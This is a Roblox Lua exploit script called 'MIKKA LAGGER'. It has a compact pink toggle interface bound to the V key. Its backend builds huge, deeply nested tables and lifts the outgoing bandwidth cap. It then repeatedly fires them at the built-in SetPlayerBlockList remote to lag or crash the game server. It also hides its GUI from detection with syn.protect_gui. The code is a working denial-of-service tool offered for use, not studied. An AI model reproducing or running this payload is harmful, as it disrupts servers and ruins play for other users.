repeat task.wait() until game:IsLoaded()

local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

-- ==================== ONYX BACKEND (UNCHANGED) ====================
local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then obj = obj[segment] else return nil end
    end
    return obj
end

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
    while laggerEnabled do
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        task.spawn(function()
            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        end)
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
    end
end

local function stopLaggerLoop()
    laggerEnabled = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Texture") or v:IsA("Decal") then
        v:Destroy()
    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
        v.Material = Enum.Material.SmoothPlastic
    end
end
-- ==================== END BACKEND ====================

-- ==================== COMPACT PINK GUI ====================
local C = {
    bg         = Color3.fromRGB(12, 8, 14),
    surface    = Color3.fromRGB(22, 14, 22),
    surfaceHi  = Color3.fromRGB(35, 20, 32),
    border     = Color3.fromRGB(50, 35, 50),
    borderHi   = Color3.fromRGB(255, 100, 160),
    accent     = Color3.fromRGB(255, 80, 150),
    accent2    = Color3.fromRGB(255, 140, 200),
    text       = Color3.fromRGB(255, 255, 255),
    textSub    = Color3.fromRGB(180, 140, 160),
    pillOff    = Color3.fromRGB(35, 20, 30),
    dotOff     = Color3.fromRGB(120, 80, 100),
    shadow     = Color3.fromRGB(0, 0, 0)
}

local boundKey = Enum.KeyCode.V
local listeningForKey = false

local gui = Instance.new("ScreenGui")
gui.Name = "PinkLagger"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000
pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
gui.Parent = game:GetService("CoreGui")

-- Shadow
local Shadow = Instance.new("Frame")
Shadow.Size = UDim2.new(0, 214, 0, 104)
Shadow.Position = UDim2.new(0, 22, 0, 22)
Shadow.BackgroundColor3 = C.shadow
Shadow.BackgroundTransparency = 0.8
Shadow.BorderSizePixel = 0
Shadow.ZIndex = 0
Instance.new("UICorner", Shadow).CornerRadius = UDim.new(0, 14)
Shadow.Parent = gui

-- Main (compact: 200x90)
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 200, 0, 90)
Main.Position = UDim2.new(0, 20, 0, 20)
Main.BackgroundColor3 = C.bg
Main.BorderSizePixel = 0
Main.Active = true
Main.ZIndex = 2
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
Main.Parent = gui

-- Pink animated border
local Border = Instance.new("Frame")
Border.Size = UDim2.new(1, 4, 1, 4)
Border.Position = UDim2.new(0, -2, 0, -2)
Border.BackgroundColor3 = C.accent
Border.BorderSizePixel = 0
Border.ZIndex = 1
Instance.new("UICorner", Border).CornerRadius = UDim.new(0, 14)
Border.Parent = Main

local BorderGrad = Instance.new("UIGradient", Border)
BorderGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, C.accent),
    ColorSequenceKeypoint.new(0.5, C.accent2),
    ColorSequenceKeypoint.new(1, C.accent)
})
BorderGrad.Rotation = 0

RunService.RenderStepped:Connect(function()
    BorderGrad.Rotation = (BorderGrad.Rotation + 2) % 360
end)

-- Main stroke
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Thickness = 1
MainStroke.Color = C.border

-- Entrance
Main.Size = UDim2.new(0, 0, 0, 0)
Main.Position = UDim2.new(0, 120, 0, 65)
TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 200, 0, 90),
    Position = UDim2.new(0, 20, 0, 20)
}):Play()

-- Header
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 0, 24)
Title.Position = UDim2.new(0, 12, 0, 6)
Title.BackgroundTransparency = 1
Title.Text = "MIKKA"
Title.TextColor3 = C.accent2
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 3
Title.Parent = Main

local Sub = Instance.new("TextLabel")
Sub.Size = UDim2.new(1, -40, 0, 12)
Sub.Position = UDim2.new(0, 12, 0, 22)
Sub.BackgroundTransparency = 1
Sub.Text = "LAGGER"
Sub.TextColor3 = C.textSub
Sub.Font = Enum.Font.GothamBold
Sub.TextSize = 8
Sub.TextXAlignment = Enum.TextXAlignment.Left
Sub.ZIndex = 3
Sub.Parent = Main

-- Status dot
local DotStatus = Instance.new("Frame")
DotStatus.Size = UDim2.new(0, 6, 0, 6)
DotStatus.Position = UDim2.new(1, -14, 0, 12)
DotStatus.BackgroundColor3 = C.border
DotStatus.BorderSizePixel = 0
DotStatus.ZIndex = 3
Instance.new("UICorner", DotStatus).CornerRadius = UDim.new(1, 0)
DotStatus.Parent = Main

-- Toggle Row (compact)
local Row = Instance.new("Frame")
Row.Size = UDim2.new(1, -20, 0, 40)
Row.Position = UDim2.new(0, 10, 0, 40)
Row.BackgroundColor3 = C.surface
Row.BorderSizePixel = 0
Row.ZIndex = 2
Instance.new("UICorner", Row).CornerRadius = UDim.new(0, 10)
Row.Parent = Main

local RowStroke = Instance.new("UIStroke", Row)
RowStroke.Color = C.border
RowStroke.Thickness = 1

-- Status text
local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, -90, 0, 16)
Status.Position = UDim2.new(0, 12, 0, 6)
Status.BackgroundTransparency = 1
Status.Text = "⚬ IDLE"
Status.TextColor3 = C.textSub
Status.Font = Enum.Font.GothamBold
Status.TextSize = 11
Status.TextXAlignment = Enum.TextXAlignment.Left
Status.ZIndex = 3
Status.Parent = Row

-- Key badge
local Badge = Instance.new("TextLabel")
Badge.Size = UDim2.new(0, 24, 0, 14)
Badge.Position = UDim2.new(0, 12, 0, 22)
Badge.BackgroundColor3 = C.pillOff
Badge.Text = boundKey.Name
Badge.TextColor3 = C.accent2
Badge.Font = Enum.Font.GothamBlack
Badge.TextSize = 7
Badge.ZIndex = 3
Instance.new("UICorner", Badge).CornerRadius = UDim.new(0, 3)
Badge.Parent = Row

-- Switch
local Pill = Instance.new("Frame")
Pill.Size = UDim2.new(0, 36, 0, 18)
Pill.Position = UDim2.new(1, -46, 0.5, -9)
Pill.BackgroundColor3 = C.pillOff
Pill.BorderSizePixel = 0
Pill.ZIndex = 3
Instance.new("UICorner", Pill).CornerRadius = UDim.new(1, 0)
Pill.Parent = Row

local Knob = Instance.new("Frame")
Knob.Size = UDim2.new(0, 12, 0, 12)
Knob.Position = UDim2.new(0, 3, 0.5, -6)
Knob.BackgroundColor3 = C.dotOff
Knob.BorderSizePixel = 0
Knob.ZIndex = 4
Instance.new("UICorner", Knob).CornerRadius = UDim.new(1, 0)
Knob.Parent = Pill

-- Hit
local Hit = Instance.new("TextButton")
Hit.Size = UDim2.new(1, 0, 1, 0)
Hit.BackgroundTransparency = 1
Hit.Text = ""
Hit.ZIndex = 5
Hit.Parent = Row

-- Drag
local dragging, dragInput, dragStart, startPos
Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
Main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        Main.Position = newPos
        Shadow.Position = UDim2.new(newPos.X.Scale, newPos.X.Offset + 2, newPos.Y.Scale, newPos.Y.Offset + 2)
    end
end)

-- Logic
local function refresh(state)
    local tw = TweenInfo.new(0.2, Enum.EasingStyle.Quad)
    local spring = TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    
    if state then
        TweenService:Create(Knob, spring, {
            Position = UDim2.new(1, -15, 0.5, -6),
            BackgroundColor3 = C.accent2
        }):Play()
        Status.Text = "● ACTIVE"
        Status.TextColor3 = C.accent2
        TweenService:Create(DotStatus, tw, {BackgroundColor3 = C.accent}):Play()
        TweenService:Create(Row, tw, {BackgroundColor3 = C.surfaceHi}):Play()
        TweenService:Create(RowStroke, tw, {Color = C.borderHi}):Play()
        TweenService:Create(MainStroke, tw, {Color = C.borderHi}):Play()
        TweenService:Create(Border, tw, {BackgroundTransparency = 0.4}):Play()
        startLagger()
    else
        TweenService:Create(Knob, spring, {
            Position = UDim2.new(0, 3, 0.5, -6),
            BackgroundColor3 = C.dotOff
        }):Play()
        Status.Text = "⚬ IDLE"
        Status.TextColor3 = C.textSub
        TweenService:Create(DotStatus, tw, {BackgroundColor3 = C.border}):Play()
        TweenService:Create(Row, tw, {BackgroundColor3 = C.surface}):Play()
        TweenService:Create(RowStroke, tw, {Color = C.border}):Play()
        TweenService:Create(MainStroke, tw, {Color = C.border}):Play()
        TweenService:Create(Border, tw, {BackgroundTransparency = 0}):Play()
        stopLaggerLoop()
    end
end

Hit.MouseButton1Click:Connect(function()
    refresh(not laggerEnabled)
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == boundKey then
        refresh(not laggerEnabled)
    end
end)

refresh(false)
